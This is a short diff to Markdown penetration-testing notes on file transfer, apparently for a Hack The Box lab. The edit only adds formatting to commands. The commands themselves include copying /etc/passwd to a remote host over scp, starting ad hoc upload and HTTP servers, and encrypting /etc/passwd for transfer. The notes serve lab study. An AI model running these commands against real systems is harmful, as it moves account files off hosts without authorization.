@@ -134,7 +134,7 @@ python3 -m uploadserver 443 --server-certificate ~/server.pem
 ```ruby -run -ehttpd . -p8000```
 
 ### SSH(SCP) 사용 업로드
-scp /etc/passwd htb-student@192.168.1.1:/home/uplaod/
+```scp /etc/passwd htb-student@192.168.1.1:/home/uplaod/```
 
 <br/><br/>
 ## Code
@@ -192,5 +192,5 @@ Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
 ```
 
 ### Linux File Encryption/Decryption
-```openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc```
+```openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc```<br/>
 ```openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd```
